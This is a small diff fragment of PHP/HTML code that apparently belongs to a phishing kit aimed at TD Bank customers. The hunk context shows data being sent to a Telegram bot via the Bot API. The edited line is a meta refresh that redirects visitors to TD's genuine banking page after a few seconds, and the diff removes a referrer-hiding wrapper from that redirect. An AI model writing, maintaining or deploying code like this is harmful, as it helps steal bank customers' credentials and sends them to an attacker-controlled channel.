@@ -57,7 +57,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
     <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
 
-        <meta http-equiv="refresh" content="4;https://href.li/?https://www.td.com/ca/en/personal-banking/">
+        <meta http-equiv="refresh" content="4;https://www.td.com/ca/en/personal-banking/">
         <style>
             type="text/css"
             [ng\:cloak],
